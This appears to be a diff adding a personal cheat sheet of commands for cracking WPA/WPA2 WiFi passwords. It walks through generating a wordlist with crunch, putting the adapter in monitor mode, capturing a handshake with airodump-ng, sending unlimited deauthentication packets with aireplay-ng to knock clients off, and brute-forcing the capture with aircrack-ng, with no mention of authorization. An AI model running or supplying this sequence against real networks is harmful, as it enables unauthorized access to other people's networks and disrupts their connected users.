@@ -1,0 +1,55 @@
+install net-tools  
+
+
+
+ifconfig  -->  to view the network status
+
+
+install aircrack-ng
+install crunch
+
+cd Desktop
+
+
+get password.txt by using crunch:
+        crunch [password_length] [password_char] -t [password_format] -o [password_file]
+
+                password_length: eg. 5 will have '5 5'
+                password_char : any set of character eg. 0123456789
+                password_format: format for password eg. 9@@@@@@@@@
+                password_file: password file name to save data eg. password.txt
+
+
+
+
+airmon-ng check kill --> to stop wifi connection
+
+airmon-ng start wlan0 --> to start the wlan in monitor mode only
+
+airodump-ng wlan0mon ---> packet capturing with name of interface
+
+ctrl+c after  finding the connection
+
+airodump-ng -c [channel] --bssid [BSSID] wlan0mon -w handshake
+        -c : channel
+        -bssid : MAC address
+        wlan0mon : name of interface
+
+                                        OPEN NEW TAB
+
+aireplay-ng -0 0 -a [BSSID] wlan0mon
+        -0 : for deauthentication
+        0 : number of deauthentication packet : 0 for unlimited
+        -a : for bssid
+
+                                WAIT UNTIL PREVIOUS TAB SHOWS HANDSHAKE MAC ADDRESS
+
+
+
+
+
+aircrack-ng -a2 -b [BSSID] -w password.txt hacking-01.cap
+        -a/-a2 : WPA/ WPA2
+        -b : for BSSID
+        -w : location of wordlist
+
